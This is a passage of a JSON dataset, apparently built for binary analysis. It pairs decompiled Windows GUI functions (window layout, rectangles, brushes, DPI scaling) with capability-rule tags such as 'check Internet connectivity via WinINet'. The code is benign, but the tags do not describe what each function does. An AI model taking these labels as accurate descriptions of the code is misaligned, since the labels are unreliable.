}\n    return 0;\n}\n",
        "token_count": 869
    },
    "0043c9eb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0043c9eb(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    \n    uVar1 = 0;\n    uVar2 = *(param_1 + 0x78) & 0xa000;\n    if (*(param_1 + 0x7c) != 0) {\n        uVar2 = uVar2 == 0;\n    }\n    if ((uVar2 == 0) || ((*(param_1 + 0x70) & 0xa000) == 0)) {\n        if ((*(param_1 + 0x70) & 0x5000) == 0) goto code_r0x0043ca47;\n        uVar1 = *(param_1 + 0x70) & 0xffff5fff;\n        puVar3 = param_1 + 0x38;\n    }\n    else {\n        uVar1 = *(param_1 + 0x70) & 0xffffafff;\n        puVar3 = param_1 + 0x28;\n    }\n    uVar1 = fcn.0044377f(*puVar3, puVar3[1], puVar3[2], puVar3[3], uVar1, 0);\ncode_r0x0043ca47:\n    if ((*(param_1 + 0x7c) == 0) && (uVar1 == 0)) {\n        if ((*(param_1 + 0x70) & 0xa000) != 0) {\n            fcn.0044377f(*(param_1 + 0x38), *(param_1 + 0x3c), *(param_1 + 0x40), *(param_1 + 0x44), \n                         *(param_1 + 0x70) & 0xffffafff, 0);\n            uVar2 = *(param_1 + 0x70) & 0xffffafff;\n            uVar1 = fcn.0044377f(*(param_1 + 0x28), *(param_1 + 0x2c), *(param_1 + 0x30), *(param_1 + 0x34), uVar2, 0);\n            uVar1 = ~-(uVar1 != uVar2) & uVar1;\n            if (uVar1 != 0) {\n                return uVar1;\n            }\n        }\n        if ((*(param_1 + 0x70) & 0x5000) != 0) {\n            fcn.0044377f(*(param_1 + 0x28), *(param_1 + 0x2c), *(param_1 + 0x30), *(param_1 + 0x34), \n                         *(param_1 + 0x70) & 0xffff5fff, 0);\n            uVar2 = *(param_1 + 0x70) & 0xffff5fff;\n            uVar1 = fcn.0044377f(*(param_1 + 0x38), *(param_1 + 0x3c), *(param_1 + 0x40), *(param_1 + 0x44), uVar2, 0);\n            uVar1 = ~-(uVar1 != uVar2) & uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 759
    },
    "0043cd91": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043cd91(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t arg_24h;\n    int32_t in_ECX;\n    uint *puVar3;\n    uint lprc;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_14h = 1;\n    var_10h = 1;\n    uVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0);\n    var_8h = fcn.00433a4b(uVar2);\n    var_ch = var_8h;\n    var_4h = fcn.0043f149();\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if ((*(in_ECX + 0x74) & 0xa000) == 0) {\n        if ((*(in_ECX + 0x74) & 0x5000) == 0) {\n            var_14h = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x20);\n            var_14h = var_14h + -1;\n            var_10h = (*pcVar1)(0x21);\n            var_10h = var_10h + -1;\n            if ((((*(in_ECX + 0x78) & 0xa000) == 0) || (*(in_ECX + 0x7c) != 0)) &&\n               (((*(in_ECX + 0x78) & 0x5000) == 0 || (*(in_ECX + 0x7c) == 0)))) {\n                puVar3 = in_ECX + 0x58;\n            }\n            else {\n                puVar3 = in_ECX + 0x48;\n            }\n            var_8h = var_4h;\n        }\n        else {\n            puVar3 = in_ECX + 0x38;\n        }\n    }\n    else {\n        puVar3 = in_ECX + 0x28;\n    }\n    lprc = *puVar3;\n    uStack36 = puVar3[1];\n    uStack32 = puVar3[2];\n    uStack28 = puVar3[3];\n    if (arg_8h != 0) {\n        var_10h = 0;\n        var_14h = 0;\n    }\n    if ((*(in_ECX + 0x75) & 0xf0) != 0) {\n        (*_sym.imp.USER32.dll_InflateRect)(&lprc, 0xffffffff, 0xffffffff);\n    }\n    arg_24h = var_4h;\n    if (*(in_ECX + 0x24) == 0) {\n        arg_24h = var_ch;\n    }\n    fcn.0043f1e8(&lprc, var_14h, var_10h, in_ECX + 0xc, *(in_ECX + 0x1c), *(in_ECX + 0x20), var_8h, arg_24h);\n    *(in_ECX + 0xc) = lprc;\n    *(in_ECX + 0x1c) = var_14h;\n    *(in_ECX + 0x10) = uStack36;\n    *(in_ECX + 0x20) = var_10h;\n    *(in_ECX + 0x14) = uStack32;\n    *(in_ECX + 0x18) = uStack28;\n    *(in_ECX + 0x24) = var_8h == var_4h;\n    return;\n}\n",
        "token_count": 851
    },
    "0043ce98": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043ce98(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    \n    if (*param_2 != param_3) {\n        *param_2 = param_3;\n        if ((((*(param_1 + 0x70) & 0xa000) == 0) || ((*(param_1 + 0x70) & 0x5000) == 0)) || (*(param_1 + 0x7c) == 0)) {\n            uVar1 = 0;\n        }\n        else {\n            uVar1 = 1;\n        }\n        *(param_1 + 0x7c) = uVar1;\n        if (*(param_1 + 0x80) == 0) {\n            uVar1 = fcn.0043c9eb();\n        }\n        else {\n            uVar1 = 0;\n        }\n        *(param_1 + 0x74) = uVar1;\n        fcn.0043cd91(0);\n    }\n    return;\n}\n",
        "token_count": 246
    },
    "0043ceea": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043ceea(int32_t arg_8h, int32_t arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_OffsetRect;\n    iVar4 = arg_8h - *(in_ECX + 4);\n    iVar2 = arg_ch - *(in_ECX + 8);\n    (*_sym.imp.USER32.dll_OffsetRect)(in_ECX + 0x28, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x48, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x38, iVar4, iVar2);\n    (*pcVar1)(in_ECX + 0x58, iVar4, iVar2);\n    *(in_ECX + 4) = arg_8h;\n    *(in_ECX + 8) = arg_ch;\n    if (*(in_ECX + 0x80) == 0) {\n        uVar3 = fcn.0043c9eb();\n    }\n    else {\n        uVar3 = 0;\n    }\n    *(in_ECX + 0x74) = uVar3;\n    fcn.0043cd91(0);\n    return;\n}\n",
        "token_count": 309
    },
    "0043d13f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d13f(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint arg_10h;\n    uint *puVar2;\n    uint arg_ch;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    int32_t var_4h;\n    \n    fcn.0043d0fa();\n    if (*(param_1 + 0x74) == 0) {\n        uVar1 = *(param_1 + 0x78);\n        if ((((uVar1 & 4) == 0) && (((uVar1 & 0xa000) == 0 || (*(param_1 + 0x7c) != 0)))) &&\n           (((uVar1 & 0x5000) == 0 || (*(param_1 + 0x7c) == 0)))) {\n            uVar1 = *(param_1 + 0x70) & 0x40 | 0x1000;\n            *(param_1 + 0xa8) = *(param_1 + 0x58);\n            arg_10h = *(param_1 + 0x5c);\n            arg_ch = *(param_1 + 0x58);\n        }\n        else {\n            uVar1 = *(param_1 + 0x70) & 0x40 | 0x2000;\n            *(param_1 + 0xa8) = *(param_1 + 0x48);\n            arg_10h = *(param_1 + 0x4c);\n            arg_ch = *(param_1 + 0x48);\n        }\n        *(param_1 + 0xac) = arg_10h;\n        *(param_1 + 0xa4) = uVar1;\n        fcn.00443675(*(param_1 + 0x68), arg_ch, arg_10h, uVar1);\n    }\n    else {\n        var_4h = fcn.0043cb03(*(param_1 + 0x74));\n        puVar2 = param_1 + 0x38;\n        if ((*(param_1 + 0x75) & 0x50) == 0) {\n            puVar2 = param_1 + 0x28;\n        }\n        var_14h = *puVar2;\n        uStack20 = puVar2[1];\n        uStack16 = puVar2[2];\n        uStack12 = puVar2[3];\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(var_4h + 0x1c));\n        uVar1 = uVar1 & 0xffff;\n        if ((0xe81a < uVar1) && (uVar1 < 0xe81f)) {\n            *(param_1 + 0x90) = uVar1;\n            *(param_1 + 0x94) = var_14h;\n            *(param_1 + 0x98) = uStack20;\n            *(param_1 + 0x9c) = uStack16;\n            *(param_1 + 0xa0) = uStack12;\n            fcn.00433413(param_1 + 0x94);\n        }\n        fcn.004434de(*(param_1 + 0x68), var_4h, &var_14h);\n        (**(**(param_1 + 0x6c) + 0x144))(1);\n    }\n    return;\n}\n",
        "token_count": 778
    },
    "0043dcac": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043dcac(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    \n    if (arg_8h == 2) {\n        fcn.0042c6f1();\n        if ((*(in_ECX + 0x15c) & 0x40) == 0) {\n            iVar2 = 1;\n            iVar1 = 0;\n            do {\n                if (*(in_ECX + 0x17c) <= iVar2) break;\n                iVar1 = fcn.0043db39();\n                iVar2 = iVar2 + 1;\n            } while (iVar1 == 0);\n            (****(iVar1 + 0x8c))(arg_ch, arg_10h);\n            return;\n        }\n    }\n    else if ((9 < arg_8h) && (arg_8h < 0x12)) {\n        fcn.0042c6f1();\n        iVar2 = 1;\n        iVar1 = 0;\n        do {\n            if (*(in_ECX + 0x17c) <= iVar2) break;\n            iVar1 = fcn.0043db39();\n            iVar2 = iVar2 + 1;\n        } while (iVar1 == 0);\n        (**(**(iVar1 + 0x8c) + 4))(arg_8h, arg_ch, arg_10h);\n        return;\n    }\n    fcn.0042b38f();\n    return;\n}\n",
        "token_count": 349
    },
    "0043de79": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0043de79(uint32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if (0xffff < param_1) {\n        param_1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_1 + 0x1c));\n        param_1 = param_1 & 0xffff;\n    }\n    iVar1 = fcn.0043dafc(param_1, 0xffffffff);\n    if (0 < iVar1) {\n        fcn.004278bd(iVar1, 1);\n        piVar2 = fcn.0041052d(iVar1 + -1);\n        if (*piVar2 == 0) {\n            piVar2 = fcn.0041052d(iVar1);\n            if (*piVar2 == 0) {\n                fcn.004278bd(iVar1, 1);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 211
    },
    "0043dee0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043dee0(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *in_ECX;\n    \n    iVar4 = arg_8h;\n    iVar1 = fcn.0043dafc(arg_8h, arg_ch);\n    if (arg_10h == 1) {\n        puVar2 = fcn.0041052d(iVar1);\n        uVar3 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(arg_8h + 0x1c));\n        *puVar2 = uVar3 & 0xffff;\n        fcn.0041052d(iVar1);\n        iVar4 = fcn.0043dafc(iVar4, iVar1);\n        if (0 < iVar4) {\n            fcn.004278bd(iVar1, 1);\n            piVar5 = fcn.0041052d();\n            if ((*piVar5 == 0) && (piVar5 = fcn.0041052d(),  *piVar5 == 0)) {\n                fcn.004278bd(iVar1, 1);\n            }\n        }\n    }\n    else {\n        fcn.004278bd(iVar1, 1);\n        piVar5 = fcn.0041052d(iVar1 + -1);\n        if ((*piVar5 == 0) && (piVar5 = fcn.0041052d(iVar1),  *piVar5 == 0)) {\n            fcn.004278bd(iVar1, 1);\n        }\n        if (arg_10h != -1) {\n            fcn.0043de79(arg_8h);\n        }\n    }\n    if (*(arg_8h + 0x8c) != 0) {\n        piVar5 = fcn.0043fbce();\n        if ((in_ECX[0x24] == 0) || (iVar4 = (**(*in_ECX + 0x168))(),  iVar4 != 0)) {\n            piVar5[0x33] = piVar5[0x33] | 0xc;\n        }\n        else {\n            iVar4 = fcn.0043de11();\n            if (iVar4 == 0) {\n                (**(*piVar5 + 0x60))();\n                return 1;\n            }\n            fcn.0042de3e(0);\n        }\n    }\n    return 0;\n}\n",
        "token_count": 583
    },
    "0043e7bb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043e7bb(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    ushort uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t *piVar4;\n    uint uFlags;\n    uchar auStack300 [16];\n    int32_t iStack284;\n    int32_t iStack280;\n    int32_t iStack276;\n    int32_t iStack272;\n    uchar auStack268 [260];\n    uint uStack8;\n    \n    uStack8 = *0x4640c8;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(param_2 + 0x1c), auStack300);\n    if (*(param_2 + 0x88) == param_1) {\n        if (param_3 == 0) goto code_r0x0043e9c4;\n        iVar2 = (*_sym.imp.USER32.dll_EqualRect)(auStack300, param_3);\n        if (iVar2 != 0) goto code_r0x0043e9c4;\n    }\n    if ((*(param_1 + 0x90) != 0) && ((*(param_2 + 0x80) & 0x40) != 0)) {\n        *(param_1 + 0x7c) = *(param_1 + 0x7c) | 0x40;\n    }\n    *(param_1 + 0x7c) = *(param_1 + 0x7c) & 0xfffffff9;\n    uVar3 = *(param_1 + 0x7c);\n    *(param_1 + 0x7c) = *(param_2 + 0x7c) & 6 | uVar3;\n    if ((uVar3 & 0x40) == 0) {\n        fcn.0042e498(auStack268, 0x104);\n        fcn.00434b8c(*(param_1 + 0x1c), auStack268);\n    }\n    uVar3 = (*(param_2 + 0x7c) ^ *(param_1 + 0x7c)) & 0xf000 ^ *(param_2 + 0x7c);\n    if (*(param_1 + 0x90) == 0) {\n        uVar3 = uVar3 & 0xfffffffe | 0xf00;\n    }\n    else {\n        uVar3 = uVar3 | 0xf01;\n    }\n    fcn.00448452(uVar3);\n    uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(param_2 + 0x1c), 0xffffffff);\n    iVar2 = fcn.0043dafc(uVar1);\n    if (0 < iVar2) {\n        piVar4 = fcn.0041052d(iVar2);\n        *piVar4 = param_2;\n    }\n    if (param_3 == 0) {\n        if (iVar2 < 1) {\n            fcn.004277fb(*(param_1 + 0x9c), param_2);\n            fcn.004277fb(*(param_1 + 0x9c), 0);\n        }\n        uFlags = 0x115;\n        iStack272 = 0;\n        iStack276 = 0;\n        iStack280 = -*0x466dbc;\n        iStack284 = -*0x466db8;\n    }\n    else {\n        (*_sym.imp.USER32.dll_CopyRect)(&iStack284, param_3);\n        fcn.00433413();\n        if (iVar2 < 1) {\n            fcn.0043db58(param_2, iStack284, iStack280, iStack276, iStack272, (iStack276 - iStack284) / 2 + iStack284, \n                         (iStack272 - iStack280) / 2 + iStack280);\n        }\n        iStack272 = iStack272 - iStack280;\n        uFlags = 0x114;\n        iStack276 = iStack276 - iStack284;\n    }\n    fcn.0042e037(0, iStack284, iStack280, iStack276, iStack272, uFlags);\n    (*_sym.imp.USER32.dll_GetParent)(*(param_2 + 0x1c));\n    iVar2 = fcn.0042b432();\n    if (iVar2 != param_1) {\n        fcn.00410567(param_1);\n    }\n    if (*(param_2 + 0x88) != 0) {\n        fcn.0043dee0(param_2, 0xffffffff, 0);\n    }\n    *(param_2 + 0x88) = param_1;\n    iVar2 = fcn.0043fbce();\n    *(iVar2 + 0xcc) = *(iVar2 + 0xcc) | 0xc;\ncode_r0x0043e9c4:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 1121
    },
    "0043eff7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043eff7(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x466dc4;\n    uVar3 = *0x466dc0;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.00433669(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, 0x9ec, uVar3);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], 0x9ec, uVar4);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 353
    },
    "0043f085": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043f085(uint *arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    uVar4 = *0x466dc4;\n    uVar3 = *0x466dc0;\n    if (in_ECX != NULL) {\n        iVar2 = (*_sym.imp.GDI32.dll_GetMapMode)(in_ECX[2]);\n        pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n        if ((iVar2 < 7) && (iVar2 != 1)) {\n            (**(*in_ECX + 0x34))(3);\n            fcn.00433600(arg_8h);\n            (**(*in_ECX + 0x34))(iVar2);\n            return;\n        }\n        uVar3 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(in_ECX[2], 0x58);\n        uVar4 = (*pcVar1)(in_ECX[2], 0x5a);\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_MulDiv;\n    uVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(*arg_8h, uVar3, 0x9ec);\n    *arg_8h = uVar3;\n    uVar4 = (*pcVar1)(arg_8h[1], uVar4, 0x9ec);\n    arg_8h[1] = uVar4;\n    return;\n}\n",
        "token_count": 353
    },
    "0043f149": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0043f149(void)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint lpvBits;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    fcn.0044673a(8);\n    if (*0x466d3c == 0) {\n        iVar2 = 0;\n        do {\n            uVar1 = iVar2;\n            iVar2 = iVar2 + 1;\n            *(&stack0xffffffe6 + iVar2 * 2) = 0x5555 << (uVar1 & 1);\n        } while (iVar2 < 8);\n        iVar2 = (*_sym.imp.GDI32.dll_CreateBitmap)(8, 8, 1, 1, &lpvBits);\n        if (iVar2 != 0) {\n            *0x466d3c = (*_sym.imp.GDI32.dll_CreatePatternBrush)(iVar2);\n            (*_sym.imp.GDI32.dll_DeleteObject)(iVar2);\n        }\n    }\n    if (*0x466d38 == '\\0') {\n        iVar2 = fcn.004114b5(0x43efc2);\n        *0x466d38 = '\\x01' - (iVar2 != 0);\n    }\n    fcn.0044679d(8);\n    fcn.00433a4b(*0x466d3c);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 327
    },
    "0043f960": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0043f9bc)\n// WARNING: Removing unreachable block (ram,0x0043f9c8)\n\nvoid fcn.0043f960(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBX;\n    \n    uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    iVar4 = (*_sym.imp.USER32.dll_GetWindow)(uVar3);\n    pcVar2 = _sym.imp.USER32.dll_ShowWindow;\n    for (; iVar4 != 0; iVar4 = (*pcVar1)(iVar4, 2)) {\n        iVar5 = fcn.0042b459(iVar4);\n        if ((((iVar5 != 0) && (*0x21 != iVar4)) && (iVar6 = fcn.0043f7c2(*0x21, iVar4),  iVar6 != 0)) &&\n           (((uVar7 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar4, 0xfffffff0),  (uVar7 & 0x18000000) == 0 &&\n             ((*(iVar5 + 0x38) & 2) != 0)) && (*(unaff_EBX + 0xb0) == 0)))) {\n            (*pcVar2)(iVar4, 4);\n            *(iVar5 + 0x38) = *(iVar5 + 0x38) & 0xfffffffd;\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "0043faef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043faef(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *(param_1 + 0xac);\n    if (param_2 != piVar1) {\n        *(param_1 + 0xac) = 0;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x15c))(0, param_2, piVar1);\n        }\n        if (((*(param_1 + 0xac) == 0) && (*(param_1 + 0xac) = param_2,  param_2 != NULL)) && (param_3 != 0)) {\n            (**(*param_2 + 0x15c))(1, param_2, piVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "0043fbe2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043fbe2(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(*param_1 + 0x158))();\n    if (iVar1 != 0) {\n        return param_1[0x24];\n    }\n    if ((param_1[0x22] != 0) && (*(param_1[0x22] + 0x90) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 117
    },
    "0043ff6a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043ff6a(uint arg_8h, uint lpIconName)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_58h;\n    uint var_38h;\n    int32_t lpClassName;\n    uint lpWndClass;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = fcn.00444bf8();\n    iVar1 = (*_sym.imp.USER32.dll_LoadIconA)(*(iVar1 + 0xc), lpIconName);\n    if (iVar1 != 0) {\n        fcn.00411850(&var_58h, 0, 0x30);\n        var_38h = arg_8h;\n        (**(*in_ECX + 100))(&var_58h);\n        if (lpClassName != 0) {\n            iVar2 = fcn.00444bf8();\n            iVar2 = (*_sym.imp.USER32.dll_GetClassInfoA)(*(iVar2 + 8), lpClassName, &lpWndClass);\n            if ((iVar2 != 0) && (var_14h != iVar1)) {\n                uVar3 = fcn.0042a818(lpWndClass, var_10h, var_ch, iVar1);\n                return uVar3;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 317
    },
    "004400b2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004400b2(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    if (param_1[0x2c] != NULL) {\n        (*param_1[0x2c])(param_1);\n    }\n    piVar1 = (**(*param_1 + 0x138))();\n    if ((piVar1 != NULL) && (iVar2 = (**(*piVar1 + 0x8c))(param_1),  iVar2 == 0)) {\n        return;\n    }\n    iVar2 = fcn.00444bf8();\n    piVar3 = *(iVar2 + 4);\n    if ((piVar3 != NULL) && (piVar3[7] == param_1)) {\n        if ((piVar1 == NULL) && (iVar2 = (**(*piVar3 + 0x94))(),  iVar2 == 0)) {\n            return;\n        }\n        fcn.004384b4();\n        fcn.0043846f();\n        iVar2 = fcn.0043f661();\n        if (iVar2 == 0) {\n            fcn.0043f681(0);\n            return;\n        }\n        iVar2 = fcn.00444bf8();\n        if ((*(iVar2 + 0x14) == '\\0') && (piVar3[7] == 0)) {\n            fcn.0044aa55(0);\n            return;\n        }\n    }\n    if ((piVar1 != NULL) && (piVar1[0x12] != 0)) {\n        var_4h = (**(*piVar1 + 0x60))();\n        do {\n            if (var_4h == NULL) {\n                (**(*piVar1 + 0x7c))();\n                return;\n            }\n            (**(*piVar1 + 100))(&var_4h);\n            piVar3 = fcn.0042bedc();\n        } while (piVar3 == param_1);\n        (**(*piVar1 + 0x94))(param_1);\n    }\n    (**(*param_1 + 0x60))();\n    return;\n}\n",
        "token_count": 511
    },
    "00440313": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
